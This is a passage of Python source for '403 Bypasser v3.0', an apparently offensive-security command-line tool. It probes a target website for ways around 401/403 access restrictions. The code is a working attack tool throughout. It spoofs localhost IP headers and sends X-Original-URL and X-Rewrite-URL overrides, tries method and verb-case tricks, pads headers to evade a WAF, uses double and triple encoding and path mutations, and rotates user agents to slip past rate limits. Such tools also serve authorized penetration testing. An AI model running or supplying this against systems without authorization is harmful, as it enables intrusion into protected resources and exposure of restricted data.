        {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost", "X-Real-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": f"/{path.lstrip('/')}"},
        {"X-Forwarded-For": "127.0.0.1", "X-Rewrite-URL": f"/{path.lstrip('/')}",
         "X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "::1", "X-Forwarded-Host": "localhost",
         "X-Original-URL": f"/{path.lstrip('/')}"},
    ]
    for combo in combos:
        h = {"User-Agent": random_user_agent()}
        h.update(combo)
        if custom_headers:
            for k, v in custom_headers.items():
                if k not in combo:
                    h[k] = v
        r = safe_request("GET", test_url, h, verbose=verbose)
        bypassed, confidence, reason = is_bypass(path, r)
        if bypassed and confidence >= 40:
            combo_str = ' + '.join(combo.keys())
            results.append((True, r.status_code, "GET", h, path,
                            f"Header combo: {combo_str}", confidence))
    return results

def test_waf_bypass(url, path, custom_headers, verbose):
    if not path:
        return []
    eff = path.lstrip('/')
    results = []

    # Large header padding
    padding = 'A' * 8000
    h = {"User-Agent": random_user_agent(), "X-Padding": padding}
    if custom_headers:
        h.update(custom_headers)
    test_url = format_url(url, eff)
    r = safe_request("GET", test_url, h, verbose=verbose)
    bypassed, confidence, reason = is_bypass(path, r)
    if bypassed and confidence >= 40:
        results.append((True, r.status_code, "GET", {"X-Padding": "(8KB padding)"}, eff,
                        "WAF bypass: large header padding", confidence))

    # Cache buster
    h2 = {"User-Agent": random_user_agent(), "Cache-Control": "no-cache, no-store", "Pragma": "no-cache"}
    if custom_headers:
        h2.update(custom_headers)
    cb_path = f"{eff}?cb={random.randint(10000,99999)}"
    test_url2 = format_url(url, cb_path)
    r2 = safe_request("GET", test_url2, h2, verbose=verbose)
    bypassed2, confidence2, reason2 = is_bypass(path, r2)
    if bypassed2 and confidence2 >= 40:
        results.append((True, r2.status_code, "GET", h2, cb_path,
                        "Cache buster bypass", confidence2))

    return results

def test_double_encoding(url, path, custom_headers, verbose):
    if not path:
        return []
    results = []
    eff = path.lstrip('/')

    # Double-encode every character
    double_encoded = ""
    for ch in eff:
        if ch == '/':
            double_encoded += "%252f"
        elif ch.isalnum():
            hex_val = format(ord(ch), '02x')
            double_encoded += f"%25{hex_val}"
        else:
            double_encoded += quote(quote(ch, safe=''), safe='')
    test_url = format_url(url, double_encoded)
    h = {"User-Agent": random_user_agent()}
    if custom_headers:
        h.update(custom_headers)
    r = safe_request("GET", test_url, h, verbose=verbose)
    bypassed, confidence, reason = is_bypass(path, r)
    if bypassed and confidence >= 40:
        results.append((True, r.status_code, "GET", h, double_encoded,
                        "Double-encoded full path", confidence))

    # Triple encode
    triple_encoded = quote(quote(quote(eff, safe=''), safe=''), safe='')
    test_url2 = format_url(url, triple_encoded)
    r2 = safe_request("GET", test_url2, h, verbose=verbose)
    bypassed2, confidence2, reason2 = is_bypass(path, r2)
    if bypassed2 and confidence2 >= 40:
        results.append((True, r2.status_code, "GET", h, triple_encoded,
                        "Triple-encoded full path", confidence2))

    return results


# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------
CONFIDENCE_LABELS = {
    range(90, 101): (f"{colors.GREEN}HIGH{colors.END}", "██████████"),
    range(70, 90): (f"{colors.GREEN}GOOD{colors.END}", "████████░░"),
    range(50, 70): (f"{colors.YELLOW}MEDIUM{colors.END}", "██████░░░░"),
    range(30, 50): (f"{colors.YELLOW}LOW{colors.END}", "████░░░░░░"),
    range(0, 30): (f"{colors.RED}NOISE{colors.END}", "██░░░░░░░░"),
}

def confidence_label(score):
    for r, (label, bar) in CONFIDENCE_LABELS.items():
        if score in r:
            return label, bar
    return "?", "░░░░░░░░░░"

def print_status(url, status_code, method, headers, path, extra_note=None, confidence=50):
    full_url = format_url(url, path) if path else url
    label, bar = confidence_label(confidence)

    print(f"\n{colors.GREEN}{colors.BOLD}[+] BYPASS FOUND{colors.END}  [{bar}] {label} ({confidence}%)")
    print(f"    {colors.CYAN}URL:{colors.END}    {full_url}")
    print(f"    {colors.CYAN}Method:{colors.END} {colors.BOLD}{method}{colors.END}")
    print(f"    {colors.CYAN}Status:{colors.END} {colors.BOLD}{status_code}{colors.END}")
    if extra_note:
        print(f"    {colors.CYAN}Note:{colors.END}   {colors.YELLOW}{extra_note}{colors.END}")
    if headers:
        custom_h = {k: v for k, v in headers.items() if k != 'User-Agent'}
        if custom_h:
            print(f"    {colors.CYAN}Headers:{colors.END}")
            for k, v in custom_h.items():
                display_v = v if len(str(v)) < 100 else str(v)[:100] + "..."
                print(f"      {k}: {display_v}")
    curl = build_curl_command(method, full_url, headers)
    print(f"    {colors.DIM}Reproduce: {curl}{colors.END}")
    print(f"    {'─' * 60}")

    record_result({
        "url": full_url,
        "method": method,
        "status": status_code,
        "confidence": confidence,
        "headers": {k: v for k, v in (headers or {}).items() if k != 'User-Agent'},
        "note": extra_note,
        "curl": curl,
    })


def load_wordlist(wordlist_file):
    try:
        with open(wordlist_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{colors.RED}[!] Wordlist file not found: {wordlist_file}{colors.END}")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Orchestration — priority-ordered phases
# ---------------------------------------------------------------------------
def run_tests(target_url, path, custom_headers=None, threads=20, verbose=False,
              skip_phases=None, fingerprint=None):
    eff_path = path if path is not None else ""
    skip = set(skip_phases or [])
    auto_skip = set()
    if fingerprint:
        auto_skip = select_phases_for_fingerprint(fingerprint)

    total_phases = 14
    phase = 0
    phase_stats = {}

    def phase_header(name, display_name=None):
        nonlocal phase
        phase += 1
        dn = display_name or name
        if name in skip:
            if verbose:
                print(f"\n{colors.DIM}[*] Phase {phase}/{total_phases}: {dn} (skipped by user){colors.END}")
            return False
        if name in auto_skip:
            if verbose:
                print(f"\n{colors.DIM}[*] Phase {phase}/{total_phases}: {dn} (skipped: not relevant for this server){colors.END}")
            return False
        # Check if we're rate-limited
        delay = adaptive_delay()
        if delay < 0:
            print(f"\n{colors.RED}[!] Phase {phase}/{total_phases}: {dn} (SKIPPED: rate limited){colors.END}")
            return False
        print(f"\n{colors.BOLD}[*] Phase {phase}/{total_phases}: {dn}{colors.END}")
        return True

    # ---- Phase 1: Baseline ----
    if phase_header("Baseline"):
        capture_baseline(target_url, eff_path, custom_headers, verbose)
        base = get_baseline(eff_path)
        if base and base["status"] not in (401, 403):
            print(f"{colors.YELLOW}[!] Baseline returned {base['status']}, not 401/403. Results may be unreliable.{colors.END}")

    # ---- Phase 2: Protocol switch ----
    if phase_header("Protocol switch"):
        s, code, m, h, p, new_url, conf = test_protocol_switch(target_url, eff_path, custom_headers, verbose)
        if s:
            print_status(new_url, code, m, h, "", extra_note="Protocol switch", confidence=conf)

    # ---- Phase 3: Root header override (HIGH VALUE) ----
    if eff_path and phase_header("Root header override"):
        for result in test_root_header_override(target_url, eff_path, custom_headers, verbose):
            found, code, m, h, matched_path, root_url, header_name, conf = result
            if found:
                print_status(root_url, code, m, h, "",
                             extra_note=f"{header_name}: {matched_path} (sent to /)", confidence=conf)

    # ---- Phase 4: HTTP methods ----
    if phase_header("HTTP methods"):
        with ThreadPoolExecutor(max_workers=effective_threads(threads)) as ex:
            futures = [ex.submit(test_fuzzing, target_url, eff_path, mth, None,
                                 custom_headers, verbose)
                       for mth in HTTP_METHODS if not any(c.isspace() for c in mth)]
            for f in as_completed(futures):
                try:
                    s, code, m, h, p, n, conf = f.result()
                    if s:
                        print_status(target_url, code, m, h, p, extra_note=f"HTTP method: {m}", confidence=conf)
                except Exception:
                    pass

    # ---- Phase 5: Verb case variants ----
    if phase_header("Verb case variants"):
        results = test_verb_case_variants(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5], confidence=r[6])

    # ---- Phase 6: Method override ----
    if eff_path and phase_header("Method override"):
        results = test_method_override(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5], confidence=r[6])

    # ---- Phase 7: Method with body ----
    if eff_path and phase_header("Method with body"):
        results = test_method_with_body(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5], confidence=r[6])

    # ---- Phase 8: Header bypass ----
    if phase_header("Header bypass"):
        with ThreadPoolExecutor(max_workers=effective_threads(threads)) as ex:
            futures = [ex.submit(test_fuzzing, target_url, eff_path, "GET",
                                 header.copy(), custom_headers, verbose)
                       for header in BYPASS_HEADERS]
            for f in as_completed(futures):
                try:
                    s, code, m, h, p, n, conf = f.result()
                    if s:
                        bypass_h = {k: v for k, v in h.items() if k != 'User-Agent'}
                        note = ', '.join(f'{k}: {v}' for k, v in bypass_h.items())
                        print_status(target_url, code, "GET", h, p, extra_note=note, confidence=conf)
                except Exception:
                    pass

    # ---- Phase 9: Header combos ----
    if eff_path and phase_header("Header combos"):
        results = test_header_combos(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5], confidence=r[6])

    # ---- Phase 10: IP spoofing (reduced, skip behind CDN) ----
    if phase_header("IP spoofing headers"):
        results = test_ip_spoofing(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5], confidence=r[6])

    # ---- Phase 11: Host header bypass ----
    if phase_header("Host header bypass"):
        results = test_host_header_bypass(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5], confidence=r[6])

    # ---- Phase 12: User-Agent bypass ----
    if phase_header("User-Agent bypass"):
        results = test_user_agent_bypass(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5], confidence=r[6])

    # ---- Phase 13: WAF bypass ----
    if eff_path and phase_header("WAF bypass"):
        results = test_waf_bypass(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5], confidence=r[6])

    # ---- Phase 14: Path / encoding / case (priority ordered) ----
    if eff_path and phase_header("Path / encoding / case"):
        eff = eff_path.lstrip('/')
        phase_jobs = []

        # Determine which path sets to use based on fingerprint
        path_sets = [("HIGH", PATH_MUTATIONS_HIGH)]

        # Filter semicolons if not Tomcat/Spring
        if '_semicolon_paths' in auto_skip:
            filtered_high = [p for p in PATH_MUTATIONS_HIGH if ';' not in p]
            path_sets = [("HIGH", filtered_high)]

        path_sets.append(("MEDIUM", PATH_MUTATIONS_MEDIUM))

        # Windows paths only for IIS
        if '_windows_paths' not in auto_skip:
            path_sets.append(("LOW", PATH_MUTATIONS_LOW))
        else:
            filtered_low = [p for p in PATH_MUTATIONS_LOW if '::$' not in p]
            path_sets.append(("LOW", filtered_low))

        for priority, mutations in path_sets:
            for technique in mutations:
                try:
                    modified = technique.format(eff)
                    if not modified.startswith('/'):
                        modified = f"/{modified}"
                    phase_jobs.append((priority, format_url(target_url, modified), modified,
                                       f"Path mutation [{priority}]"))
                except (IndexError, KeyError):
                    continue

        # Case variations
        case_variants = {
            eff.upper(), eff.lower(), eff.capitalize(), eff.swapcase(),
            ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(eff)),
        }
        case_variants.discard(eff)
        for variant in case_variants:
            phase_jobs.append(("MEDIUM", format_url(target_url, variant), variant, "Case variation"))

        # Char-by-char encoding (limit to first 20 chars to avoid explosion)
        for i, ch in enumerate(eff[:20]):
            if not ch.isalnum():
                continue
            hex_l = format(ord(ch), '02x')
            for variant in (
                eff[:i] + f"%{hex_l}" + eff[i+1:],
                eff[:i] + f"%25{hex_l}" + eff[i+1:],
            ):
                phase_jobs.append(("LOW", format_url(target_url, variant), variant, "Char URL encoding"))

        # Double/triple encoding
        enc_results = test_double_encoding(target_url, eff_path, custom_headers, verbose)
        for r in enc_results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5], confidence=r[6])

        def _job(priority, url_, display_path, note):
            delay = adaptive_delay()
            if delay < 0:
                return None
            h = {"User-Agent": random_user_agent()}
            if custom_headers:
                h.update(custom_headers)
            r = safe_request("GET", url_, h, verbose=verbose)
            bypassed, confidence, reason = is_bypass(eff_path, r)
            if bypassed and confidence >= 40:
                # Boost confidence for high-priority techniques
                if priority == "HIGH":
                    confidence = min(100, confidence + 10)
                return priority, r.status_code, h, display_path, note, confidence
            return None

        with ThreadPoolExecutor(max_workers=effective_threads(threads)) as ex:
            futures = [ex.submit(_job, *job) for job in phase_jobs]
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        priority, code, h, display, note, conf = res
                        print_status(target_url, code, "GET", h, display, extra_note=note, confidence=conf)
                except Exception:
                    pass

    # Print rate limit stats
    with _lock:
        total_req = RATE_LIMIT_STATE["total_requests"]
        if verbose and total_req > 0:
            print(f"\n{colors.DIM}[*] Total requests sent: {total_req}{colors.END}")
            if RATE_LIMIT_STATE["blocked"]:
                print(f"{colors.RED}[!] Rate limiting detected — some phases were skipped{colors.END}")

# ---------------------------------------------------------------------------
# HTTP/0.9 and HTTP/1.0 phases
# ---------------------------------------------------------------------------
def run_protocol_tests(target_url, path, custom_headers, verbose, skip):
    results = []
    if "HTTP/0.9" not in skip:
        s, code, m, h, p, conf = test_http_0_9(target_url, path, verbose)
        if s:
            results.append(("HTTP/0.9", code, m, h, p, "Raw HTTP/0.9 response", conf))

    if "HTTP/1.0 downgrade" not in skip:
        s, code, m, h, p, conf = test_http_1_0(target_url, path, custom_headers, verbose)
        if s:
            results.append(("HTTP/1.0", code, m, h, p, "HTTP/1.0 protocol downgrade", conf))

    return results


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def banner():
    n_ip = len(IP_SPOOF_PRIORITY)
    n_methods = len(HTTP_METHODS) + len(HTTP_METHOD_CASE_VARIANTS)
    n_paths = len(PATH_MUTATIONS_HIGH) + len(PATH_MUTATIONS_MEDIUM) + len(PATH_MUTATIONS_LOW)
    n_headers = len(BYPASS_HEADERS)

    print(f"""{colors.RED}{colors.BOLD}
    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃         403 BYPASSER v3.0                       ┃
    ┃         Intelligent 403/401 Bypass Testing       ┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{colors.END}
{colors.DIM}    14 phases | Server fingerprinting | Confidence scoring
    {n_methods} HTTP methods | {n_ip} IP spoof combos | {n_paths} path mutations
    {n_headers} header tricks | Body analysis | Adaptive rate limiting{colors.END}
""")

def main():
    parser = argparse.ArgumentParser(
        description='Intelligent 403/401 Bypass Testing Tool v3.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://example.com admin
  %(prog)s https://example.com admin,dashboard,api/v1/users
  %(prog)s https://example.com -w paths.txt -t 30
  %(prog)s https://example.com admin -o results.json -v
  %(prog)s https://example.com admin --skip ip-spoof,waf
  %(prog)s https://example.com admin --no-fingerprint
        """)
    parser.add_argument('url', help='Target URL')
    parser.add_argument('paths', nargs='?', default=None,
                        help='Paths to test (comma-separated)')
    parser.add_argument('-w', '--wordlist', help='Wordlist of paths')
    parser.add_argument('-H', '--header', action='append', dest='headers',
                        help='Custom HTTP header "Header: Value" (repeatable)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Detailed output during test')
    parser.add_argument('-t', '--threads', type=int, default=15,
                        help='Number of threads (default: 15)')
    parser.add_argument('-o', '--output', help='Save findings to JSON file')
    parser.add_argument('--skip', help='Skip phases (comma-separated): '
                        'protocol,http09,http10,root-override,methods,verb-case,'
                        'method-override,method-body,ip-spoof,headers,header-combos,'
                        'ua,host,waf,path-encode')
    parser.add_argument('--no-fingerprint', action='store_true',
                        help='Disable server fingerprinting (run all techniques)')
    parser.add_argument('--min-confidence', type=int, default=40,
                        help='Minimum confidence to report (0-100, default: 40)')
    args = parser.parse_args()

    banner()

    if not args.url.startswith(('http://', 'https://')):
        args.url = f'https://{args.url}'
    target_url = args.url.rstrip('/')

    custom_headers = parse_custom_headers(args.headers)
    if custom_headers:
        print(f"{colors.CYAN}[*] Custom headers:{colors.END}")
        for k, v in custom_headers.items():
            print(f"    {k}: {v}")

    # Server fingerprinting
    fingerprint = None
    if not args.no_fingerprint:
        print(f"\n{colors.BOLD}[*] Fingerprinting target...{colors.END}")
        fingerprint = fingerprint_server(target_url, custom_headers, args.verbose)
        print(f"{colors.CYAN}[*] {fingerprint}{colors.END}")
        auto_skip = select_phases_for_fingerprint(fingerprint)
        if auto_skip:
            readable = [s for s in auto_skip if not s.startswith('_')]
            if readable:
                print(f"{colors.YELLOW}[*] Auto-skipping: {', '.join(readable)}{colors.END}")

    skip_map = {
        'protocol': 'Protocol switch',
        'http09': 'HTTP/0.9',
        'http10': 'HTTP/1.0 downgrade',
        'root-override': 'Root header override',
        'methods': 'HTTP methods',
        'verb-case': 'Verb case variants',
        'method-override': 'Method override',
        'method-body': 'Method with body',
        'ip-spoof': 'IP spoofing headers',
        'headers': 'Header bypass',
        'header-combos': 'Header combos',
        'ua': 'User-Agent bypass',
        'host': 'Host header bypass',
        'waf': 'WAF bypass',
        'path-encode': 'Path / encoding / case',
    }
    skip_phases = set()
    if args.skip:
        for s in args.skip.split(','):
            s = s.strip().lower()
            if s in skip_map:
                skip_phases.add(skip_map[s])
            else:
                print(f"{colors.YELLOW}[!] Unknown phase to skip: {s}{colors.END}")

    print(f"{colors.BOLD}[*] Target: {target_url}{colors.END}")

    def _run_path(p):
        global BASELINE, RESULTS, RATE_LIMIT_STATE
        # Reset rate limit state per path
        with _lock:
            RATE_LIMIT_STATE = {"consecutive_429": 0, "delay": 0.0, "total_requests": 0, "blocked": False, "max_threads": args.threads}

        # Run HTTP/0.9 and HTTP/1.0 tests
        proto_results = run_protocol_tests(target_url, p, custom_headers, args.verbose, skip_phases)
        for proto_name, code, m, h, eff, note, conf in proto_results:
            print_status(target_url, code, m, h, eff, extra_note=note, confidence=conf)

        run_tests(target_url, p, custom_headers, args.threads, args.verbose, skip_phases, fingerprint)

    if args.wordlist:
        paths = load_wordlist(args.wordlist)
        print(f"{colors.BOLD}[*] Loaded {len(paths)} paths from wordlist{colors.END}")
        for p in paths:
            print(f"\n{'═' * 60}")
            print(f"{colors.BOLD}[*] Testing path: {p}{colors.END}")
            print(f"{'═' * 60}")
            _run_path(p)
    elif args.paths:
        path_list = [p.strip() for p in args.paths.split(',')]
        for p in path_list:
            print(f"\n{'═' * 60}")
            print(f"{colors.BOLD}[*] Testing path: {p}{colors.END}")
            print(f"{'═' * 60}")
            _run_path(p)
    else:
        _run_path(None)

    # Summary
    print(f"\n{'═' * 60}")
    with _lock:
        results_copy = list(RESULTS)

    if results_copy:
        # Sort by confidence
        results_copy.sort(key=lambda x: x.get('confidence', 0), reverse=True)
        high_conf = [r for r in results_copy if r.get('confidence', 0) >= 70]
        med_conf = [r for r in results_copy if 40 <= r.get('confidence', 0) < 70]
        low_conf = [r for r in results_copy if r.get('confidence', 0) < 40]

        print(f"{colors.GREEN}{colors.BOLD}[+] Total findings: {len(results_copy)}{colors.END}")
        if high_conf:
            print(f"    {colors.GREEN}High confidence: {len(high_conf)}{colors.END}")
        if med_conf:
            print(f"    {colors.YELLOW}Medium confidence: {len(med_conf)}{colors.END}")
        if low_conf:
            print(f"    {colors.RED}Low confidence: {len(low_conf)}{colors.END}")

        print(f"\n{colors.BOLD}Findings (sorted by confidence):{colors.END}")
        for i, r in enumerate(results_copy, 1):
            conf = r.get('confidence', 0)
            label, _ = confidence_label(conf)
            print(f"    {i}. [{r['status']}] {r['method']} {r['url']}  {label} ({conf}%)")
            if r.get('note'):
                print(f"       {colors.DIM}{r['note']}{colors.END}")
    else:
        print(f"{colors.RED}[-] No bypasses found{colors.END}")

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results_copy if results_copy else [], f, indent=2)
        print(f"\n{colors.GREEN}[+] {len(results_copy)} finding(s) saved to {args.output}{colors.END}")

if __name__ == "__main__":
    main()
